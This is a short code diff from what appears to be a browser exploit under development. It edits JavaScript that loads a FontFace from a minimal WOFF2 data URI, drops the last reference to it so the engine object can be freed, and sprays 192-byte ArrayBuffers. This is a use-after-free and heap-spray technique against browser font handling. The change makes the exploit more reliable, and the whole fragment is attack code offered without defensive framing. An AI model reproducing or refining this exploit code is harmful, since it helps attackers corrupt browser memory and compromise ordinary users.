@@ -41,8 +41,7 @@
     try {
       // Create FontFace with a data: URI (tiny valid WOFF2 or empty)
       // Using a minimal valid font to trigger the internal alloc
-      const fontData = new ArrayBuffer(16);
-      const ff = new FontFace('leak', 'url(data:font/woff2;base64,d09GMk9UVE8AAAAMAA==)');
+      let ff = new FontFace('leak', 'url(data:font/woff2;base64,d09GMk9UVE8AAAAMAA==)');
 
       // Load triggers internal object allocation
       ff.load().then(() => {
@@ -57,10 +56,9 @@
 
       // Give the engine a moment to process, then spray
       setTimeout(() => {
-        // Null out the FontFace reference to allow GC
-        // (the spec says load() returns a promise that prevents immediate GC,
-        //  but the internal CSSFontFace may be freed if not added to document)
-
+        // Drop the JS wrapper before spraying so it cannot retain the engine
+        // object (the local binding alone kept it reachable until this timer).
+        ff = null;
         // Spray 192-byte ArrayBuffers
         const FONT_SPRAY = 256;
         const fontSpray = [];
